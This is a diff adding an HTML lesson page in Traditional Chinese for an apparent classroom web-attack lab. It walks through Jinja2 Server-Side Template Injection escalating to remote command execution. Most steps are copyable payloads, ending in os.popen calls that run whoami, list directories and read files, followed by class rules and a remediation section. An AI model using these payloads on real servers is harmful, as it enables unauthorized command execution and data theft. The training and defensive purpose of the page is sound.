@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab 03 SSTI to RCE | ESAM WEB ATTACK LAB</title>
+<meta name="description" content="Server-Side Template Injection 靶機教學：由 Jinja2 模板注入逐步升級到遠端指令執行，含可複製 payload。">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="nav">
+  <div class="brand">ESAM<span>//</span>WEB_ATTACK_LAB</div>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="lab1-sqli.html">01 SQLi</a>
+    <a href="lab2-xss.html">02 XSS</a>
+    <a href="lab3-ssti.html">03 SSTI</a>
+  </div>
+</nav>
+
+<main class="wrap">
+  <div class="kicker">// LAB 03</div>
+  <h1 class="title">SSTI to RCE</h1>
+  <p class="lead">頁面把網址參數直接拼進模板字串，交由 Jinja2 模板引擎解析。攻擊者可從簡單的算式注入，沿物件鏈逐步取得 Python 的 os 模組，最終在伺服器上執行任意系統指令。</p>
+  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">PORT 5002</span></p>
+
+  <h2>漏洞原理</h2>
+  <p>靶機以 <code>render_template_string()</code> 將使用者輸入直接拼進模板字串，輸入因此被 Jinja2 當成模板語法執行；加上 <code>debug=True</code> 未關閉，使攻擊面進一步放大。測試網址格式如下：</p>
+  <div class="cmd">
+    <div class="cmd-head"><span>url format</span><button class="copy">Copy</button></div>
+    <pre>http://&lt;靶機網址&gt;/?input=&lt;payload&gt;</pre>
+  </div>
+
+  <h2>操作步驟</h2>
+  <ol class="steps">
+    <li>
+      <strong>確認輸入被輸出。</strong>頁面顯示 hello，代表參數會被回填。
+      <div class="cmd">
+        <div class="cmd-head"><span>?input=</span><button class="copy">Copy</button></div>
+        <pre>hello</pre>
+      </div>
+    </li>
+    <li>
+      <strong>確認存在 SSTI。</strong>頁面顯示 <code>49</code> 而非字串 <code>7*7</code>，代表輸入被當算式執行。
+      <div class="cmd">
+        <div class="cmd-head"><span>?input=</span><button class="copy">Copy</button></div>
+        <pre>{{7*7}}</pre>
+      </div>
+    </li>
+    <li>
+      <strong>判斷模板引擎。</strong>顯示 <code>7777777</code>，確認為 Jinja2（Python / Flask）。
+      <div class="cmd">
+        <div class="cmd-head"><span>?input=</span><button class="copy">Copy</button></div>
+        <pre>{{7*'7'}}</pre>
+      </div>
+    </li>
+    <li>
+      <strong>沿物件鏈取得 os 模組。</strong>逐層貼入，目的是從模板環境爬到 Python 內建函式。
+      <div class="cmd">
+        <div class="cmd-head"><span>?input= 逐層測試</span><button class="copy">Copy</button></div>
+        <pre>{{request}}
+{{config}}
+{{request.application.__globals__.__builtins__.__import__('os')}}</pre>
+      </div>
+    </li>
+    <li>
+      <strong>遠端指令執行 (RCE)。</strong>頁面回傳伺服器的使用者名稱，代表已能在伺服器上執行任意指令。
+      <div class="cmd">
+        <div class="cmd-head"><span>RCE payload</span><button class="copy">Copy</button></div>
+        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</pre>
+      </div>
+    </li>
+    <li>
+      <strong>替換指令延伸操作。</strong>將 <code>whoami</code> 換成其他指令，例如列目錄或讀檔。
+      <div class="cmd">
+        <div class="cmd-head"><span>列出目錄</span><button class="copy">Copy</button></div>
+        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}}</pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-head"><span>讀取檔案</span><button class="copy">Copy</button></div>
+        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('cat surprise.txt').read()}}</pre>
+      </div>
+    </li>
+  </ol>
+
+  <div class="note danger">
+    <span class="label">課堂規則</span>
+    取得 RCE 後請勿執行破壞性指令。不要 <code>rm -rf</code>、不要更改密碼、不要 <code>sudo</code>，以免靶機損壞影響其他學員。
+  </div>
+
+  <h2>防禦修補</h2>
+  <p>不要把使用者輸入拼進模板字串，改用 <code>render_template('檔案.html', 變數=...)</code> 將輸入當成變數傳入。生產環境關閉 <code>debug</code>，並以沙箱與最小權限執行伺服器，即使發生 RCE 也難以擴大影響。</p>
+  <div class="cmd">
+    <div class="cmd-head"><span>對照</span><button class="copy">Copy</button></div>
+    <pre># 漏洞寫法：輸入被拼進模板
+render_template_string("Hello " + user_input)
+
+# 正確寫法：輸入當變數傳入，不參與模板解析
+render_template("index.html", name=user_input)</pre>
+  </div>
+
+  <div class="pager">
+    <a href="lab2-xss.html">← Lab 02 XSS</a>
+    <span class="spacer"></span>
+    <a href="index.html">回首頁 →</a>
+  </div>
+</main>
+
+<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 &nbsp;//&nbsp; Web 攻防實戰 Lab</footer>
+<script src="app.js"></script>
+</body>
+</html>
